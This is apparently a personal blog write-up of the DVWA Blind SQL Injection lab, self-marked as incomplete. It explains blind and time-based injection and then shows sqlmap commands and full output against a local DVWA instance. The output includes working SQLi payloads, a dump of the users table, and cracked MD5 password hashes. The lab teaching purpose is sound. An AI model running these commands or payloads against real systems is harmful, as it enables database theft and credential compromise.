---
title: DVWA - SQL Injection (Blind)
date: 2023-12-14
categories: [DVWA, SQL Injection (Blind)]
tags: [dvwa, sqli, blind-sqli, burp-suite, sqlmap, md5, hash]
img_path: /assets/dvwa/sqli_blind
published: true
---

> SECTION NOT WORKING PROPERLY - WRITE UP NOT COMPLETE!
{: .prompt-warning}

## Information

- [How to install dvwa on Kali](https://www.kali.org/tools/dvwa/).
- [Official GitHub repository](https://github.com/digininja/DVWA).

> The DVWA server itself contains instructions about almost everything.

_**Damn Vulnerable Web Application (DVWA)** is a PHP/MySQL web application that is damn vulnerable. Its main goal is to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and to aid both students & teachers to learn about web application security in a controlled class room environment._

_The aim of DVWA is to practice some of the most common web vulnerabilities, with various levels of difficultly, with a simple straightforward interface._

![](dvwa_home.png){: width='70%' }

The DVWA server has **4 different security levels** which can be set as seen below:

![](security_levels.png){: width='70%' }

- **Low**: This security level is completely vulnerable and has no security measures at all. It's use is to be as an example of how web application vulnerabilities manifest through bad coding practices and to serve as a platform to teach or learn basic exploitation techniques.
- **Medium**: This setting is mainly to give an example to the user of bad security practices, where the developer has tried but failed to secure an application. It also acts as a challenge to users to refine their exploitation techniques.
- **High**: This option is an extension to the medium difficulty, with a mixture of harder or alternative bad practices to attempt to secure the code. The vulnerability may not allow the same extent of the exploitation, similar in various Capture The Flags (CTFs) competitions.
- **Impossible**: This level should be secure against all vulnerabilities. It is used to compare the vulnerable source code to the secure source code.

## SQL Injection (Blind)

When an attacker executes SQLi attacks, sometimes the server responds with error messages from the database server complaining that the SQL query's syntax is incorrect. **Blind SQLi is identical to normal SQLi except that when an attacker attempts to exploit an application, rather then getting a useful error message, they get a generic page specified by the developer instead**. This makes exploiting a potential SQLi attack more difficult but not impossible. An attacker can still steal data by asking a series of True and False questions through SQL statements, and monitoring how the web application response (valid entry retunred or 404 header set).

**"time based" injection** method is often used when there is no visible feedback in how the page different in its response (hence its a blind attack). This means the attacker will wait to see how long the page takes to response back. If it takes longer than normal, their query was successful.

**Objective**: Find the version of the SQL database software through a Blind SQLi attack.

## Security: Low
> _The SQL query uses RAW input that is directly controlled by the attacker. All they need to-do is escape the query and then they are able to execute any SQL query they wish ([Source code](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/dvwa/sqli_blind/sqli_blind_low_source.php))._

1. Let's start by see how this works:

    ![](low_user_exist.png)

    ![](low_user_missing.png)

2. Next, let's try to perform a **time-based injection** to see if that works:

    ![](low_sleep.png)

3. What is different here versus the previous SQLi attack, is that instead of data as an output we only get a `TRUE`, i.e., `User ID exists in the database.`, or a `FALSE`, i.e., `User ID is MISSING from the database.`, message which indicates if our query worked or not. For instance, if we try to use the `ORDER BY` clause in order to find the number of existing columns:

    ![](low_orderby_1.png)

    ![](low_orderby_2.png)

    <!-- ![](low_orderby_3.png) -->

## Automated SLQi attack

1. We can use [`sqlmap`](https://github.com/sqlmapproject/sqlmap) to automatically test for SQLi vulnerabilities. We need to define the URL (`--url`), cookie (`--cokie`), data (`--data`), and the parameter we want to test for SQLi (`-p`). Here we also pass the `--dbs` option asking it to enumerate DBMS databases.

> We can see all options with `sqlmap -hh`.

    ![](burp_sqlmap_params.png)

    ```shell
    $ sqlmap --url="http://127.0.0.1:42001/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=tnusaaspju33gd737338bcnhrl; security=low" --data="id=1&Submit=Submit" -p id --dbs
            ___
        __H__
    ___ ___[.]_____ ___ ___  {1.7.12#stable}
    |_ -| . [']     | .'| . |
    |___|_  [(]_|_|_|__,|  _|
        |_|V...       |_|   https://sqlmap.org

    [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

    [*] starting @ 10:17:13 /2023-12-14/

    [10:17:13] [INFO] testing connection to the target URL
    [10:17:13] [INFO] checking if the target is protected by some kind of WAF/IPS
    [10:17:13] [INFO] testing if the target URL content is stable
    [10:17:14] [INFO] target URL content is stable
    [10:17:14] [WARNING] heuristic (basic) test shows that POST parameter 'id' might not be injectable
    [10:17:14] [INFO] testing for SQL injection on POST parameter 'id'
    [10:17:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
    [10:17:14] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
    [10:17:14] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
    [10:17:14] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
    [10:17:14] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
    [10:17:14] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
    [10:17:14] [INFO] testing 'Generic inline queries'
    [10:17:14] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
    [10:17:14] [WARNING] time-based comparison requires larger statistical model, please wait. (done)
    [10:17:14] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
    [10:17:14] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
    [10:17:14] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
    [10:17:14] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
    [10:17:14] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
    [10:17:14] [INFO] testing 'Oracle AND time-based blind'
    it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] y
    [10:17:28] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
    [10:17:28] [WARNING] POST parameter 'id' does not seem to be injectable
    [10:17:28] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
    [10:17:28] [INFO] testing for SQL injection on GET parameter 'id'
    it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
    for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
    [10:17:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
    [10:17:45] [WARNING] reflective value(s) found and filtering out
    [10:17:45] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --code=200)
    [10:17:45] [INFO] testing 'Generic inline queries'
    [10:17:45] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
    [10:17:45] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
    [10:17:45] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
    [10:17:45] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
    [10:17:45] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
    [10:17:45] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
    [10:17:45] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
    [10:17:45] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
    [10:17:45] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
    [10:17:45] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
    [10:17:45] [INFO] testing 'MySQL inline queries'
    [10:17:45] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
    [10:17:45] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
    [10:17:45] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
    [10:17:45] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
    [10:17:45] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
    [10:17:45] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
    [10:17:45] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
    [10:17:55] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
    [10:17:55] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
    [10:17:55] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
    [10:17:55] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
    [10:17:55] [INFO] target URL appears to have 2 columns in query
    do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] y
    injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y
    [10:18:01] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql')
    [10:18:01] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
    [10:18:01] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
    [10:18:01] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
    [10:18:01] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
    [10:18:01] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
    [10:18:01] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
    [10:18:01] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
    [10:18:01] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
    [10:18:01] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
    [10:18:01] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
    GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
    sqlmap identified the following injection point(s) with a total of 352 HTTP(s) requests:
    ---
    Parameter: id (GET)
        Type: boolean-based blind
        Title: AND boolean-based blind - WHERE or HAVING clause
        Payload: id=1' AND 2879=2879 AND 'FGUV'='FGUV&Submit=Submit

        Type: error-based
        Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
        Payload: id=1' AND (SELECT 5082 FROM(SELECT COUNT(*),CONCAT(0x716b627071,(SELECT (ELT(5082=5082,1))),0x717a716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'VSXt'='VSXt&Submit=Submit

        Type: time-based blind
        Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
        Payload: id=1' AND (SELECT 9523 FROM (SELECT(SLEEP(5)))RuBI) AND 'DZYn'='DZYn&Submit=Submit
    ---
    [10:18:03] [INFO] the back-end DBMS is MySQL
    web application technology: Nginx 1.24.0
    back-end DBMS: MySQL >= 5.0 (MariaDB fork)
    [10:18:03] [INFO] fetching database names
    [10:18:03] [INFO] retrieved: 'information_schema'
    [10:18:03] [INFO] retrieved: 'dvwa'
    available databases [2]:
    [*] dvwa
    [*] information_schema

    [10:18:03] [WARNING] HTTP error codes detected during run:
    404 (Not Found) - 5 times
    [10:18:03] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/127.0.0.1'

    [*] ending @ 10:18:03 /2023-12-14/
    ```

2. So we found out that there are 2 databases: `dvwa` and `information_schema`. We can now proceed on enumerating the tables (`--tables`) of the `dvwa` database (`-D dvwa`). We also added the `--batch` option to avoid prompts and go with the defaults and `--threads` to speed up the process:

    ```shell
    $ sqlmap --url="http://127.0.0.1:42001/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=tnusaaspju33gd737338bcnhrl; security=low" --data="id=1&Submit=Submit" -p id -D dvwa --tables --batch --threads 5
            ___
        __H__
    ___ ___[']_____ ___ ___  {1.7.12#stable}
    |_ -| . ["]     | .'| . |
    |___|_  [.]_|_|_|__,|  _|
        |_|V...       |_|   https://sqlmap.org

    [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

    [*] starting @ 10:38:55 /2023-12-14/

    [10:38:55] [INFO] resuming back-end DBMS 'mysql'
    [10:38:55] [INFO] testing connection to the target URL
    sqlmap resumed the following injection point(s) from stored session:
    ---
    Parameter: id (GET)
        Type: boolean-based blind
        Title: AND boolean-based blind - WHERE or HAVING clause
        Payload: id=1' AND 2879=2879 AND 'FGUV'='FGUV&Submit=Submit

        Type: error-based
        Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
        Payload: id=1' AND (SELECT 5082 FROM(SELECT COUNT(*),CONCAT(0x716b627071,(SELECT (ELT(5082=5082,1))),0x717a716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'VSXt'='VSXt&Submit=Submit

        Type: time-based blind
        Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
        Payload: id=1' AND (SELECT 9523 FROM (SELECT(SLEEP(5)))RuBI) AND 'DZYn'='DZYn&Submit=Submit
    ---
    [10:38:55] [INFO] the back-end DBMS is MySQL
    web application technology: Nginx 1.24.0
    back-end DBMS: MySQL >= 5.0 (MariaDB fork)
    [10:38:55] [INFO] fetching tables for database: 'dvwa'
    [10:38:55] [INFO] starting 2 threads
    [10:38:55] [INFO] retrieved: 'users'
    [10:38:55] [INFO] retrieved: 'guestbook'
    Database: dvwa
    [2 tables]
    +-----------+
    | guestbook |
    | users     |
    +-----------+

    [10:38:55] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/127.0.0.1'

    [*] ending @ 10:38:55 /2023-12-14/
    ```

3. In just 1 second(!) we managed to found out the there are two tables: `guestbook` and `users`. Now all we have to do is to extract information from the `users` table (`-T users`). We also added the `--dump` option so it actually shows us what it have found:

    ```shell
    $ sqlmap --url="http://127.0.0.1:42001/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=tnusaaspju33gd737338bcnhrl; security=low" --data="id=1&Submit=Submit" -p id -T users --batch --threads 5 --dump
            ___
        __H__
    ___ ___[']_____ ___ ___  {1.7.12#stable}
    |_ -| . [(]     | .'| . |
    |___|_  [']_|_|_|__,|  _|
        |_|V...       |_|   https://sqlmap.org

    [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

    [*] starting @ 10:42:51 /2023-12-14/

    [10:42:51] [INFO] resuming back-end DBMS 'mysql'
    [10:42:51] [INFO] testing connection to the target URL
    sqlmap resumed the following injection point(s) from stored session:
    ---
    Parameter: id (GET)
        Type: boolean-based blind
        Title: AND boolean-based blind - WHERE or HAVING clause
        Payload: id=1' AND 2879=2879 AND 'FGUV'='FGUV&Submit=Submit

        Type: error-based
        Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
        Payload: id=1' AND (SELECT 5082 FROM(SELECT COUNT(*),CONCAT(0x716b627071,(SELECT (ELT(5082=5082,1))),0x717a716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'VSXt'='VSXt&Submit=Submit

        Type: time-based blind
        Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
        Payload: id=1' AND (SELECT 9523 FROM (SELECT(SLEEP(5)))RuBI) AND 'DZYn'='DZYn&Submit=Submit
    ---
    [10:42:51] [INFO] the back-end DBMS is MySQL
    web application technology: Nginx 1.24.0
    back-end DBMS: MySQL >= 5.0 (MariaDB fork)
    [10:42:51] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
    [10:42:51] [INFO] fetching current database
    [10:42:51] [INFO] retrieved: 'dvwa'
    [10:42:51] [INFO] fetching columns for table 'users' in database 'dvwa'
    [10:42:51] [INFO] starting 5 threads
    [10:42:51] [INFO] retrieved: 'user_id'
    [10:42:51] [INFO] retrieved: 'first_name'
    [10:42:52] [INFO] retrieved: 'last_name'
    [10:42:52] [INFO] retrieved: 'password'
    [10:42:52] [INFO] retrieved: 'int(6)'
    [10:42:52] [INFO] retrieved: 'user'
    [10:42:52] [INFO] retrieved: 'varchar(15)'
    [10:42:52] [INFO] retrieved: 'varchar(15)'
    [10:42:52] [INFO] retrieved: 'varchar(15)'
    [10:42:52] [INFO] retrieved: 'varchar(32)'
    [10:42:52] [INFO] retrieved: 'avatar'
    [10:42:52] [INFO] retrieved: 'last_login'
    [10:42:52] [INFO] retrieved: 'varchar(70)'
    [10:42:52] [INFO] retrieved: 'failed_login'
    [10:42:52] [INFO] retrieved: 'timestamp'
    [10:42:52] [INFO] retrieved: 'int(3)'
    [10:42:52] [INFO] fetching entries for table 'users' in database 'dvwa'
    [10:42:52] [INFO] starting 5 threads
    [10:42:52] [INFO] retrieved: 'admin'
    [10:42:52] [INFO] retrieved: 'gordonb'
    [10:42:52] [INFO] retrieved: '1337'
    [10:42:52] [INFO] retrieved: 'smithy'
    [10:42:52] [INFO] retrieved: 'pablo'
    [10:42:52] [INFO] retrieved: '/hackable/users/admin.jpg'
    [10:42:52] [INFO] retrieved: '/hackable/users/gordonb.jpg'
    [10:42:52] [INFO] retrieved: '/hackable/users/1337.jpg'
    [10:42:52] [INFO] retrieved: '/hackable/users/pablo.jpg'
    [10:42:52] [INFO] retrieved: '0'
    [10:42:52] [INFO] retrieved: '/hackable/users/smithy.jpg'
    [10:42:52] [INFO] retrieved: '0'
    [10:42:52] [INFO] retrieved: '0'
    [10:42:52] [INFO] retrieved: '0'
    [10:42:52] [INFO] retrieved: 'admin'
    [10:42:52] [INFO] retrieved: 'Hack'
    [10:42:52] [INFO] retrieved: '0'
    [10:42:52] [INFO] retrieved: 'Pablo'
    [10:42:52] [INFO] retrieved: '2023-12-12 14:29:30'
    [10:42:52] [INFO] retrieved: 'Gordon'
    [10:42:52] [INFO] retrieved: '2023-12-12 14:29:30'
    [10:42:52] [INFO] retrieved: 'Bob'
    [10:42:52] [INFO] retrieved: '2023-12-12 14:29:30'
    [10:42:52] [INFO] retrieved: '2023-12-12 14:29:30'
    [10:42:52] [INFO] retrieved: 'admin'
    [10:42:52] [INFO] retrieved: 'Me'
    [10:42:52] [INFO] retrieved: '2023-12-12 14:29:30'
    [10:42:52] [INFO] retrieved: 'Picasso'
    [10:42:52] [INFO] retrieved: '5f4dcc3b5aa765d61d8327deb882cf99'
    [10:42:52] [INFO] retrieved: '8d3533d75ae2c3966d7e0d4fcc69216b'
    [10:42:52] [INFO] retrieved: 'Brown'
    [10:42:52] [INFO] retrieved: 'Smith'
    [10:42:52] [INFO] retrieved: '0d107d09f5bbe40cade3de5c71e9e9b7'
    [10:42:52] [INFO] retrieved: '3'
    [10:42:52] [INFO] retrieved: '5f4dcc3b5aa765d61d8327deb882cf99'
    [10:42:52] [INFO] retrieved: 'e99a18c428cb38d5f260853678922e03'
    [10:42:52] [INFO] retrieved: '4'
    [10:42:52] [INFO] retrieved: '1'
    [10:42:52] [INFO] retrieved: '2'
    [10:42:52] [INFO] retrieved: '5'
    [10:42:52] [INFO] recognized possible password hashes in column 'password'
    do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
    do you want to crack them via a dictionary-based attack? [Y/n/q] Y
    [10:42:52] [INFO] using hash method 'md5_generic_passwd'
    what dictionary do you want to use?
    [1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
    [2] custom dictionary file
    [3] file with list of dictionary files
    > 1
    [10:42:52] [INFO] using default dictionary
    do you want to use common password suffixes? (slow!) [y/N] N
    [10:42:52] [INFO] starting dictionary-based cracking (md5_generic_passwd)
    [10:42:52] [INFO] starting 16 processes
    [10:42:53] [INFO] cracked password 'abc123' for hash 'e99a18c428cb38d5f260853678922e03'
    [10:42:53] [INFO] cracked password 'charley' for hash '8d3533d75ae2c3966d7e0d4fcc69216b'
    [10:42:54] [INFO] cracked password 'letmein' for hash '0d107d09f5bbe40cade3de5c71e9e9b7'
    [10:42:55] [INFO] cracked password 'password' for hash '5f4dcc3b5aa765d61d8327deb882cf99'
    Database: dvwa
    Table: users
    [5 entries]
    +---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
    | user_id | user    | avatar                      | password                                    | last_name | first_name | last_login          | failed_login |
    +---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
    | 1       | admin   | /hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      | 2023-12-12 14:29:30 | 0            |
    | 2       | gordonb | /hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     | 2023-12-12 14:29:30 | 0            |
    | 3       | 1337    | /hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       | 2023-12-12 14:29:30 | 0            |
    | 4       | pablo   | /hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      | 2023-12-12 14:29:30 | 0            |
    | 5       | smithy  | /hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        | 2023-12-12 14:29:30 | 0            |
    +---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+

    [10:42:56] [INFO] table 'dvwa.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/127.0.0.1/dump/dvwa/users.csv'
    [10:42:56] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/127.0.0.1'

    [*] ending @ 10:42:56 /2023-12-14/
    ```
4. It was able to enumerate the table and crack the hashes in just 5 seconds!

## Security: Medium
> _The medium level uses a form of SQL injection protection, with the function of [`mysql_real_escape_string()`](https://www.php.net/manual/en/function.mysql-real-escape-string.php). However due to the SQL query not having quotes around the parameter, this will not fully protect the query from being altered. The text box has been replaced with a pre-defined dropdown list and uses POST to submit the form ([Source code](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/dvwa/sqli_blind/sqli_medium_source.php))._

## Security: High
> _This is very similar to the low level, however this time the attacker is inputting the value in a different manner. The input values are being transferred to the vulnerable query via session variables using another page, rather than a direct GET request ([Source code](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/dvwa/sqli_blind/sqli_blind_high_source.php))._

## Security: Impossible
> _The queries are now parameterized queries (rather than being dynamic). This means the query has been defined by the developer, and has distinguish which sections are code, and the rest is data ([Source code](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/dvwa/sqli_blind/sqli_blind_impossible_source_code.php))._

## Resources

- Cryptocat's [video walkthrough](https://www.youtube.com/watch?v=uN8Tv1exPMk).
- Cybr's [Blind SQL Injections with SQLMap against the DVWA](https://www.youtube.com/watch?v=joZKlgR1J5A).
- Hacktricks [SQLMap - Cheetsheet](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap).